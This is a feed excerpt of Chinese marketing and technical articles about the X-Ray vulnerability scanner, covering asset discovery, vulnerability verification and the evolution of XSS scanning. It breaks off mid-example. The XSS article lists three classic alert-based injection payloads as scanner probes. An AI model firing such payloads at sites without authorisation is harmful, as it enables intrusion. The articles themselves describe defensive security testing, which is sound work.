&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2f3154e763c6d2a5d2ea58b88a8049aa_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;多年来，资产发现不全、人工管理效率低、不能及时感知风险等，一直都是企业安全亟待解决的问题。针对这样的企业需求，近年来市面上的资产管理、安全评估类产品层出不穷、数不胜数。但是令企业头疼的问题真正解决了吗？答案是“没有”。&lt;/blockquote&gt;&lt;p&gt;诸如以下问题，依然困扰着企业安全管理者：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;企业资产发现不全&lt;/li&gt;&lt;li&gt;使用 SPA      框架的网站，普通爬虫无法获取资源&lt;/li&gt;&lt;li&gt;企业资产复杂，不好管理&lt;/li&gt;&lt;li&gt;……&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;随着技术领域的日新月异，企业数字化转型所面临的环境越来越复杂，资产管理与风险控制显然已成为企业关注的重点问题。洞鉴（X-Ray）便是在这样的背景下应运而生，希望能够尽一份绵薄之力。那么，洞鉴（X-Ray）在这个复杂的网络空间中，是如何做到有的放矢的呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;资产发现&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;多种方法全面发现资产信息&lt;/b&gt;&lt;/p&gt;&lt;p&gt;面对复杂的场景，洞鉴（X-Ray）针对不同的场景环境，提供了不同的资产发现方法。下面从主动资产发现和被动资产发现两个主要方面展开说明。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;主动资产发现&lt;/li&gt;&lt;ul&gt;&lt;li&gt;域名资产发现&lt;br&gt; 洞鉴（X-Ray）在将爆破、信息资源收集、域传送三种方法智能结合的同时，还加入历史 DNS 查询、根据域名注册人信息反查等方法，扩展性强，使企业按需进行域名资产的发现。&lt;/li&gt;&lt;li&gt;Web 资产发现，分为普通爬虫和模拟浏览器爬虫&lt;br&gt; 普通爬虫，与传统同类产品大同小异，这里重点说下模拟浏览器爬虫。&lt;br&gt; 模拟浏览器爬虫，采取内置浏览器的方式，针对       API 接口、单页应用等获取信息资源困难的情况，比如使用       AngularJS、ReactJS、EmberJS、VueJS       等主流 SPA 框架的网站，对抓取的页面先渲染（执行 Javascript 脚本），然后再对页面内容进行抓取，可以爬取到普通爬虫无法爬取的复杂       Web 资产信息资源，满足企业对       Web 资产全面、准确爬取的需求。&lt;/li&gt;&lt;li&gt;主机资产发现&lt;br&gt; 提供不同深度的主机资产发现模式，满足对特定端口进行定时监控需求。&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;被动资产发现&lt;br&gt; 洞鉴（X-Ray）的被动资产发现，从代理、流量、日志三种方式被动地进行资产采集，是对主动资产发现的完美补充。&lt;/li&gt;&lt;ul&gt;&lt;li&gt;基于代理的被动资产发现&lt;br&gt; 通过 HTTP 代理的方式，对关注的资产信息进行定制化采集，既快又准。&lt;/li&gt;&lt;li&gt;基于流量的被动资产发现&lt;br&gt; 通过流量镜像的方式，导入pcap日志或者通过指定网卡实时检测流量，从实时流量中动态获取/更新资产，获取全接口请求，使得资产信息采集达到高的覆盖率。&lt;/li&gt;&lt;li&gt;基于日志的被动资产发现&lt;br&gt; 基于日志的被动资产发现，支持直接导入       syslog 日志或者类似雷池（SafeLine）等 WAF 产品的日志，快速的对资产信息进行采集。&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;由此可见，被动资产发现的扫描策略，可以做到&lt;/p&gt;&lt;ul&gt;&lt;li&gt;精准率高，可以收集到一些主动资产发现途径难以发现的资产&lt;/li&gt;&lt;li&gt;覆盖率高、种类全，可以同时输出各个种类的资产，例如：域名、主机、服务等&lt;/li&gt;&lt;li&gt;覆盖场景全，几乎覆盖所有场景，包括设备、网站、APP等&lt;/li&gt;&lt;li&gt;省时，资产信息采集不需耗时&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;多种类多维度详细展示资产信息&lt;/b&gt;&lt;/p&gt;&lt;p&gt;洞鉴（X-Ray）在进行资产采集时，能够遨游整个网络空间，全面探测授权范围内的设备和网站资产。通过强大的资产指纹库建立各类型资产的特征，包括网络设备、安全设备、各类操作系统、数据库、应用中间件，并且会对一些特定服务加强探测，对每个资产的结果进行多样化的信息展示。&lt;/p&gt;&lt;p&gt;域名、主机、服务和web 站点的资产详细信息&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;资产统计截图&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;939&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;939&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;Web 资产详情截图&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;733&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;733&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;资产间互相关联&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;洞鉴（X-Ray）将资产按照域名、主机、服务（端口）和 Web 站点进行分类展示，同时对各类资产进行互相关联，形成一种巨大的资产关联网。每个域名对应的主机、每个主机开放的服务、是否有网站等，使企业可以对自己的资产一目了然。&lt;/p&gt;&lt;p&gt;各类资产之间的关联关系如下图所示：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;522&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;522&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_b.jpg&quot;&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;实时监测资产的风险&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了对资产信息资源的管理，洞鉴（X-Ray）还提供了对企业资产的风险检测功能。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;支持对企业资产定时检测&lt;br&gt; 企业用户可以对关注资产设置定时扫描，在对已经发现的资产进行风险检测的同时，还可以自动发现新增的资产（新增主机、新开放的端口等），并对这些新增资产一并进行风险检测，检测完毕后企业负责人会在第一时间收到检测通知，对企业风险资产做相关说明。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;支持对企业资产应急检测&lt;br&gt; 当有新的漏洞爆出来时，洞鉴（X-Ray）可以做到第一时间更新升级，进而使企业对自己的资产进行及时检测，以保证企业资产的安全。&lt;/li&gt;&lt;/ul&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;591&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;591&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文从资产发现、资产关联和风险检测三个方面，讲述了洞鉴（X-Ray）对企业级资产管理与风险控制解决方案，旨在更好地帮助企业做到资产发现更全面、资产关联关系更清晰、资产风险发现更及时。感兴趣的朋友可以打开长亭官网点击试用，了解更多的产品详情。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-01-29-55967856</guid>
<pubDate>Tue, 29 Jan 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>洞鉴（X-Ray）手记之二 | 以攻击者视角智能探测漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-01-18-55204575.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/55204575&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b0eee306b34e541c1bbef7db764bdeb6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;“漏洞就如同雨后蘑菇，永远都摘不完，一场大雨之后，新的蘑菇又冒出来了。”&lt;/blockquote&gt;&lt;p&gt;随着国家对网络安全的重视，公众对 Web 安全的关注聚焦，越来越多的行业领域开始将扫描器作为首选的企业安全评估系统，比如检测院所等政府机构、联通移动等大型运营商、银行证券等金融行业……然而网站环境的复杂和差异，让扫描器很难自如应对各种场景，比如： &lt;/p&gt;&lt;p&gt;* 认证使用 JWT 的网站&lt;/p&gt;&lt;p&gt;* 前端技术为主的单页应用&lt;/p&gt;&lt;p&gt;* 伪静态 Web 应用&lt;/p&gt;&lt;p&gt;* 前端路由加后端渲染模板的应用&lt;/p&gt;&lt;p&gt;* 利用 iframe 嵌套的应用&lt;/p&gt;&lt;p&gt;所以，如何智能地识别场景，帮助企业用户快速发现漏洞、识别漏洞、定位漏洞，并验证漏洞是否真实存在，成了当下亟待解决的问题。&lt;/p&gt;&lt;p&gt;而国内外主流漏扫产品均存在误报率和漏报率高、安全评估不准、扫描效率低下、不适用于复杂的网站环境等缺陷。为了解决实际场景问题，洞鉴（X-Ray）从攻击者的视角出发，智能判断场景，对漏洞进行探测和验证，从而大大提高了扫描准确率，真正起到防微杜渐的作用。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;洞鉴(X-Ray)智能探测工作模式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;扫描器在做漏洞探测时，一般都是分为以下几步进行：&lt;/p&gt;&lt;p&gt;1. 确认探测目标，建立 TCP 连接&lt;/p&gt;&lt;p&gt;2. 从数据库中提取待检测的漏洞&lt;/p&gt;&lt;p&gt;3. 根据特定扫描策略检测目标&lt;/p&gt;&lt;p&gt;4. 根据目标服务器返回的信息判断漏洞是否存在，以及给出漏洞说明、验证信息和修复建议等&lt;/p&gt;&lt;p&gt;而所谓的攻击者视角智能探测，主要体现在了两个方面，一是探测目标的收集，二是漏洞探测的匹配。这些在人工渗透测试的过程中都是凭借个人经验来进行探测的。在这里，我们赋予洞鉴（X-Ray）智能算法，以攻击者的角度从外网环境黑盒的视角智能发现攻击点。&lt;/p&gt;&lt;p&gt;以 Web 扫描为例，对于普通应用界面和伪静态界面，洞鉴（X-Ray）会采用普通爬虫进行 Web 扫描，其中在对伪静态界面扫描期间，会智能加入去重算法，对信息采集过程进行优化。而对于单页应用界面各种复杂的情况，洞鉴（X-Ray）可以采用模拟浏览器的方式进行主动扫描，或者人工触发的方式进行被动扫描，最终将采集到的目标作为扫描目标，进入漏洞探测阶段。工作原理如下图所示：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1272&quot; data-rawheight=&quot;988&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1272&quot; data-original=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1272&quot; data-rawheight=&quot;988&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1272&quot; data-original=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_b.jpg&quot;&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;特色优势&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;适用场景丰富&lt;/b&gt;&lt;/p&gt;&lt;p&gt;支持对业界主流的 Web 安全攻防靶场的扫描，比如 DVWA、WebGoat、Benchmark、PentesterLab；在覆盖传统扫描器适用的场景外，洞鉴（X-Ray）也支持以下网站环境（不限于此）的扫描：&lt;/p&gt;&lt;p&gt;- 用 React、Vue 等动态生成页面的技术框架开发的网站&lt;/p&gt;&lt;p&gt;- 单页应用&lt;/p&gt;&lt;p&gt;- 利用 iframe 嵌套的应用&lt;/p&gt;&lt;p&gt;- 基于 JWT 认证网站，例如：JWT 认证一般 Token 不一定存在 Cookie 中，而是放在 Authorization 这个头中的，会定时刷新&lt;/p&gt;&lt;p&gt;- 基于 HTTP 请求头的特殊场景：token 和一个 random number 在 cookie 中，每次动态请求，服务器都会返回 Set Cookie，设置新的 token 和 random number&lt;/p&gt;&lt;p&gt;下面是洞鉴对单页 Web 应用靶场的扫描结果展示，单页应用采用 JWT 认证，网站开发涉及 React、Vue、Bootstrap 技术框架的应用，存在的漏洞有 SQL 注入、XSS、命令注入等主流漏洞。&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1151&quot; data-rawheight=&quot;886&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1151&quot; data-original=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1151&quot; data-rawheight=&quot;886&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1151&quot; data-original=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;验证性漏洞，准确率高&lt;/b&gt;&lt;/p&gt;&lt;p&gt;洞鉴（X-Ray）扫描出的每个漏洞都是真实验证的，货真价实。每个漏洞详情，都会给出漏洞位置、验证方式和利用方式的详细说明。既满足了没有任何技术基础的人可以读懂漏洞、验证漏洞的要求，还进一步证实了洞鉴探测漏洞的准确性。&lt;/p&gt;&lt;p&gt;洞鉴（X-Ray）支持对 DVWA 不同安全等级进行探测，探测结果如下图所示： &lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1252&quot; data-rawheight=&quot;576&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1252&quot; data-original=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1252&quot; data-rawheight=&quot;576&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1252&quot; data-original=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;安全可靠，无害验证&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个时候，可能有人会有疑问，直接验证漏洞、利用漏洞，难道不会对网站或服务器造成什么危害吗？ 比如比较典型的危害就是误删、误改业务数据等。其实针对可能会造成危害的情形，在洞鉴（X-Ray）系统中都针对性地做了特殊处理，可以说我们的 POC 在验证漏洞时是对正常业务完全无害的。类似的处理比如 ：&lt;/p&gt;&lt;p&gt;- 在探测 delete、drop 类型的 sql 注入漏洞时，我们虽然会验证漏洞，但是不会添加类似把用户信息删掉的 payload&lt;/p&gt;&lt;p&gt;- 在探测 DOS 漏洞时，洞鉴不存在 DOS 客户服务的 POC，而是通过其他维度来探测 DOS 漏洞 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;作为一家以技术为核心的网络安全公司，长亭科技将时刻关注业界动态，以前瞻性的技术格局和敏锐的攻击者思维去探索企业安全的新问题，发现网络安全世界的新规律，赋予洞鉴（X-Ray）更加智能的探测方法，以防微杜渐的安全思路，保证企业网站业务的安全可靠运行，更好地为各行各业保驾护航。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-01-18-55204575</guid>
<pubDate>Fri, 18 Jan 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>精细化扫描 XSS 漏洞 – 智能化场景分析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-01-12-54732352.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/54732352&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-afcdb3cdf59c979edfc9d8f9c5108178_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;XSS 攻击简单、危害大&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;Web 应用的研发人员对用户的输入输出若不加以严格控制，会导致产生 XSS 漏洞。XSS 漏洞的利用方式也非常简单，普通的攻击者通过 XSS 漏洞发起攻击可以获取用户（甚至是管理员）的访问权限进行敏感操作。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;传统扫描 XSS 的方式&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;多年来，XSS 泛滥成灾，在 OWASP TOP 10 中的地位居高不下，安全研究者提出了许多 XSS 漏洞的扫描方式，我们来回顾一下：&lt;/p&gt;&lt;p&gt;&lt;b&gt;第一代 XSS 漏洞扫描&lt;/b&gt;&lt;/p&gt;&lt;p&gt;安全工作者通常喜欢用弹框（js 中的 alert 函数）来证明一个页面是否存在 XSS 漏洞，因此也诞生了一批流传非常广泛的 XSS Payload：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;
&amp;lt;body onload=alert(/xss/)&amp;gt;
&amp;lt;img src=# onerror=alert(/xss/)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;带着以上 Payload 进行访问，如果看到一个类似这样的弹框，说明漏洞真实存在。&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c7f20ab29dcf3272f2316174f0d74d4a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;413&quot; data-rawheight=&quot;131&quot; class=&quot;content_image&quot; width=&quot;413&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c7f20ab29dcf3272f2316174f0d74d4a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;413&quot; data-rawheight=&quot;131&quot; class=&quot;content_image lazy&quot; width=&quot;413&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-c7f20ab29dcf3272f2316174f0d74d4a_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-281f9969c489c6364810b367e8405c0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;410&quot; data-rawheight=&quot;153&quot; class=&quot;content_image&quot; width=&quot;410&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-281f9969c489c6364810b367e8405c0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;410&quot; data-rawheight=&quot;153&quot; class=&quot;content_image lazy&quot; width=&quot;410&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-281f9969c489c6364810b367e8405c0d_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;第一代 XSS 漏洞扫描工具就是利用这个思路，在工具内部集成了大量 XSS Payload，在扫描时逐个进行尝试，自动将参数替换为 Payload，如果服务端的响应中包含相同的字符串就认为发现了 XSS 漏洞。&lt;/p&gt;&lt;p&gt;第一代 XSS 漏洞扫描工具填补了历史的空白，可以发现了大量初级 XSS 漏洞，但是随着 XSS 攻击的发展，衍生出了新的 XSS 攻击手段，此类工具也完成了它的历史使命，它解决不了的问题包括：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;原始 Payload 无法灵活变形，无法应对需要 DOM 渲染才能触发的 XSS 漏洞&lt;/li&gt;&lt;li&gt;输出点的部位不一定可执行，会造成误报&lt;/li&gt;&lt;li&gt;服务端有过滤逻辑时返回的字符串与原始 Payload 有差异，可能导致无法匹配响应中被过滤后的 Payload&lt;/li&gt;&lt;li&gt;如果 Content-Type 不是 text/html，即使 Payload 能够输出也无法执行&lt;/li&gt;&lt;li&gt;服务端有防护时，许多 Payload 会导致请求直接被拦截&lt;/li&gt;&lt;li&gt;等等&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;第二代 XSS 漏洞扫描&lt;/b&gt;&lt;/p&gt;&lt;p&gt;当大量初级 XSS 漏洞被解决之后，攻击者对于 XSS 漏洞的利用方式也逐渐成熟，安全建设对于 XSS 漏洞的目标变成了“全面解决 XSS 攻击”。这个时期出现了许多思路新颖的 XSS 漏洞扫描工具，这些工具能覆盖许多第二代 XSS 漏洞扫描工具无法发现的问题，在当初的年代堪称神器，但是依然存在着或多或少的问题，因此始终无法推广到整个行业，成为可量产的 XSS 扫描基础算法。&lt;/p&gt;&lt;p&gt;第二代扫描中表现最出色的方式是调用真实浏览器来辅助判断，hook 浏览器的基础函数，累积更加庞大的 Payload 规则库，覆盖更多的输入输出场景，使浏览器告诉扫描器漏洞是否可实际被利用。这种扫描思路的特点是：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;几乎没有误报&lt;/li&gt;&lt;li&gt;可以发现部分 DOM 型 XSS&lt;/li&gt;&lt;li&gt;会发送大量 HTTP 请求&lt;/li&gt;&lt;li&gt;每次请求都需要调用浏览器进行渲染，因此扫描速度奇慢无比&lt;/li&gt;&lt;li&gt;扫描效果与 Payload 的覆盖量息息相关&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;传统方式的不足，为什么要精细化扫描 XSS 漏洞&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;无论是第一代还是第二代 XSS 漏洞扫描，都缺少了对于上下文的理解以及对于场景的分析，无法摆脱其 Fuzz 的本质，优化的方向也停留在“如何使猜测的结果更靠近真实结果”，而不是“如何正向推理得出正确答案”，因此依然由于多场景是无法解决的，问题在于：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Web 业务复杂，输出点的类型非常多，payload 不可能覆盖所有的情况&lt;/li&gt;&lt;li&gt;依然无法解决 WAF 会拦截敏感 payload 的问题&lt;/li&gt;&lt;li&gt;误报漏洞的问题依然严重&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;那么有没有一种可以快速、深度、精准的 XSS 漏洞探测方法呢？&lt;/p&gt;&lt;p&gt;&lt;b&gt;智能化场景分析技术&lt;/b&gt;&lt;br&gt; &lt;/p&gt;&lt;p&gt;从历史的行程来看，XSS 漏洞扫描需要解决根本的问题在于对于输入输出场景的识别，对于不同浏览器渲染方式的理解，以及对于服务器处理方式的灵活应对。&lt;/p&gt;&lt;p&gt;长亭洞鉴使用了一种全新的 XSS 漏洞分析算法，脱离了传统的对于 Payload 规则库的依赖，无需大量发送 HTTP 请求即可完成页面分析，定位存在的 XSS 漏洞，并智能化生成最终的复测 Payload。&lt;/p&gt;&lt;p&gt;看一个简单的例子，有以下 URL：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//xx.chaitin.cn/test%3Fp%3D866f268a344ba71fa4b0&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xx.chaitin.cn/test?&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;p=866f268a344ba71fa4b0&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;用户访问后会得到如下的返回： &lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code 